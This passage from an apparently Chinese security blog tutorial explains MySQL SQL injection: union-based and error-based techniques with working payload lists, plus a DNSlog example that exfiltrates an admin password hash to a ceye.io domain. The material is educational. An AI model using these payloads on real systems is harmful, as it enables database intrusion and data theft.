id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><p>延时n秒，执行之后返回0。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| sleep(2) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        0 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="exists"><a href="#exists" class="headerlink" title="exists()"></a>exists()</h5><p>exists子句返回的结果并不是从数据库中取出的结果集，而是一个布尔值，如果子句查询到数据，那么返回true，反之返回false。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exists(select * from math);</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| exists(<span class="keyword">select</span> * <span class="keyword">from</span> math) |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">|                          <span class="number">1</span> |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><ul><li><p>按位或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>|<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>|<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>^<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>^<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位与</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>&amp;<span class="number">5464</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>&amp;<span class="number">5464</span> |</span><br><span class="line">+--------+</span><br><span class="line">|      <span class="number">0</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>0与任何的数字A按位或、异或都是A数字。</p><p>0与任何数字按位与都是0。</p><p>逻辑运算符</p><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><ul><li><p>与运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>;</span><br><span class="line">+---------+</span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> |</span><br><span class="line">+---------+</span><br><span class="line">|       <span class="number">0</span> |</span><br><span class="line">+---------+    </span><br><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>;   </span><br><span class="line">+---------+     </span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> |      </span><br><span class="line">+---------+      </span><br><span class="line">|       <span class="number">1</span> |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure></li><li><p>或运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br></pre></td></tr></table></figure></li><li><p>非运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">not</span> <span class="number">1</span>;</span><br><span class="line">  +-------+</span><br><span class="line">  | <span class="keyword">not</span> <span class="number">1</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  |     <span class="number">0</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select !<span class="number">0</span>;</span><br><span class="line">  +----+</span><br><span class="line">  | !<span class="number">0</span> |</span><br><span class="line">  +----+</span><br><span class="line">  |  <span class="number">1</span> |</span><br><span class="line">  +----+</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>原理：</p><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为<code>union</code>或<code>union all</code>。</p><p>条件：</p><p>页面有回显、有占位符</p><p>占位符：</p><p>从数据库中取出某些输入能够显示到页面上的某一个位置。</p><p>步骤：</p><ul><li><p>判断是否有注入</p></li><li><p>判断是数字型注入还是字符型注入</p></li><li><p>猜测查询列数</p><p>列数小,正常回显,num大,不回显。</p></li><li><p>寻找占位</p></li><li><p>获取所有数据库名</p></li><li><p>获取指定数据的所有表名</p></li><li><p>获取指定数据库的指定数据表的所有字段名</p></li><li><p>获取指定数据库的指定数据表的所有的内容</p></li></ul><h6 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h6><p>判断字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断显示位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库banner信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select version(),database()#</span></span><br></pre></td></tr></table></figure><p>判断数据库名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata–+</span><br></pre></td></tr></table></figure><p>判断数据库中的表名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断数据库中的表的列的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断字段内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul><li><p>BIGINT等数据类型溢出</p><ul><li><p>原理：</p><ul><li><p>在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。</p><p>在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>超出最大值就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure></li><li><p>SQL注入利用</p><p>组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+!(select*from(select user())x);</span><br><span class="line">ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39;</span><br></pre></td></tr></table></figure><p>返回0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select user())x</span><br></pre></td></tr></table></figure><p>返回1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~0+!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x)-~0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0;</span><br></pre></td></tr></table></figure></li></ul><p>注意：</p><p>当MySQL版本大于或等于5.5.53时，数据溢出注入无效。</p></li><li><p>exp()函数：当传入的数值大于709的时候就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure></li><li><p>exp函数与整形溢出结合</p><ul><li><p>mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.26    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from (select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure></li><li><p>mysql5.5.47可以在报错中返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>xpath语法错误</p><ul><li><p>原理：</p><p>mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。</p><ul><li><p>updatexml()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XMLdocument, XPathstring, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39;</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()对XML文档进行查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br><span class="line">第一个参数：可以传入目标xml文档</span><br><span class="line">第二个参数：用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure><p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主键重复</p><ul><li><p>基本函数</p><ul><li><p>rand()</p><p>rand()随机产生一个0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0.006128073675677249 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.33123136435750067 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>rand(0)产生一个固定的0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有几条数据就会返回几条随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand() from math;</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">|   0.6377726314941167 |</span><br><span class="line">|   0.1951690951317261 |</span><br><span class="line">|  0.06252761190992558 |</span><br><span class="line">|   0.7271308048880946 |</span><br><span class="line">|  0.44807121944434125 |</span><br><span class="line">| 0.058963713291067366 |</span><br><span class="line">|   0.9506049388559581 |</span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from math;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>floor()该函数返回X的最大整数值，但不能大于X</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(5.23);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(5.23) |</span><br><span class="line">+-------------+</span><br><span class="line">|           5 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。</p><p><code>floor(rand(0)*2)</code>:具有确定性</p><p><code>floor(rand()*2)</code>:具有不确定性</p></li></ul></li><li><p>原理：</p><p>count()和group by在遇到rand()产生的重复值时报错。</p><p><code>Select name,count(*)  from student group by name</code>    </p><p>这条语句的作用就是从<code>student</code>表中<code>select</code>出<code>name</code>和<code>count</code>(count会具体返回一个数字).这个数字的多少就是根据<code>grop by</code> 后面的<code>name</code>来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。</p><p>重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？</p><p>发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 <code>key</code> ，一个是计数值 <code>count(*)</code></p><p><strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组</strong></p><p>同理我们根据<code>floor(rand(0)*2)</code>进行分组—–这里要注意<code>floor(rand(0)*2)</code>执行之后是有规律的返回0或者1。</p><p>根据之前rand的顺序—011011011,我们来梳理一下为什么会报错</p><ul><li><p>第一次计算执行一次产生0,表中不存在任何数据,然后开始插入</p></li><li><p>插入的时候会进行第二次计算,所以在执行一次产生1插入</p></li><li><p>第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算</p></li><li><p>第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,<strong>注意是产生一个分组,不是单纯的产生一个数值</strong></p><p>此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。</p></li></ul><p>注意：</p><p>sql语句在执行之后建立虚表分两种情况：</p><p>1、表中没有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>会被执行两次。</p><p>2、表中有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>只会被执行一次。</p><p>主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据</p></li></ul></li><li><p>几何函数</p><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数</p><p>这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。</p></li><li><p>DNSlog外带配合报错注入</p><p>作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\&#39;,(SELECT hex(pass) </span><br><span class="line">FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\abc&#39;))</span><br></pre></td></tr></table></figure><p>load_file函数在Linux下是无法用来做dnslog攻击的。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\sss.xxx\test\</p><p>这也就解释了为什么CONCAT()函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用UNC路径。</p><p>tips：</p><p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br></pre></td></tr></table></figure></li></ul><h6 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;  and extractvalue(1,concat(0x7e,user(),0x7e))<span class="comment">#</span></span><br><span class="line">-1&#x27;  and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and updatexml(1,concat(0x7e,user(),0x7e),1)#</span></span><br><span class="line"><span class="string">-1&#x27;</span>  <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;  and (select 1 from(select count(),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span></span><br></pre></td></tr></table></figure><h5 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h5><ul><li><p>常用函数</p><ul><li>limit [位置偏移量,]行数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math limit 